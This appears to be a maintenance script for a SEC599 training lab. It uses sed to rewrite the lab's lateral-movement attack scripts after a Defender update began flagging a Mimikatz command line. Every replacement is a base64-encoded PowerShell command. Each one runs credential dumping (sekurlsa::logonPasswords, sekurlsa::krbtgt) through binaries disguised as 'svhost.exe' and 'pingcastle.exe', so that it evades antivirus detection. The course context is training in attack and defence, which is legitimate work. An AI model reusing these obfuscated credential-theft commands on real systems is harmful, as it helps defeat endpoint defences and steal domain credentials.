# SEC599 Maintenance script for Kali DTF
# --------------------------------------
# Last update: 30 August 2019
# This script is used for emergency patches / updates in SEC599

# Issue description: A recent Defender update triggers on the following exact commandline combination: "privilege::debug sekurlsa::logonPasswords"
# Solution: Use PowerShell to avoid "privilege::debug" (PowerShell already has debug privilege)

# Fix for Windows01
/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxkd2lnaHQuc2NocnV0ZVxcRG93bmxvYWRzXFxzdmhvc3QuZXhlIHNla3VybHNhOjpsb2dvblBhc3N3b3JkcyBleGl0'/g" /root/Desktop/CTF/4-movetowin01-INITIAL.sh
/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxkd2lnaHQuc2NocnV0ZVxcRG93bmxvYWRzXFxzdmhvc3QuZXhlIHNla3VybHNhOjpsb2dvblBhc3N3b3JkcyBleGl0'/g" /root/Desktop/CTF/4-movetowin01-FINAL.sh

# Fix for Windows02
/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxhbGFuLm1hcnNoYWxsXFxEb3dubG9hZHNcXHN2aG9zdC5leGUgc2VrdXJsc2E6OmxvZ29uUGFzc3dvcmRzIGV4aXQ='/g" /root/Desktop/CTF/5-movetowin02-INITIAL.sh
/bin/sed -i "s/'C:.*\\\\svhost.exe privilege::debug sekurlsa::logonPasswords exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxhbGFuLm1hcnNoYWxsXFxEb3dubG9hZHNcXHN2aG9zdC5leGUgc2VrdXJsc2E6OmxvZ29uUGFzc3dvcmRzIGV4aXQ='/g" /root/Desktop/CTF/5-movetowin02-FINAL.sh

# Fix for DC
/bin/sed -i "s/'C:.*\\\\pingcastle.exe privilege::debug sekurlsa::krbtgt exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxBZG1pbmlzdHJhdG9yXFxEb3dubG9hZHNcXHBpbmdjYXN0bGUuZXhlIHNla3VybHNhOjprcmJ0Z3QgZXhpdA=='/g" /root/Desktop/CTF/6-movetodc-INITIAL.sh
/bin/sed -i "s/'C:.*\\\\pingcastle.exe privilege::debug sekurlsa::krbtgt exit'/'powershell.exe -Enc QzpcXFVzZXJzXFxBZG1pbmlzdHJhdG9yXFxEb3dubG9hZHNcXHBpbmdjYXN0bGUuZXhlIHNla3VybHNhOjprcmJ0Z3QgZXhpdA=='/g" /root/Desktop/CTF/6-movetodc-FINAL.sh
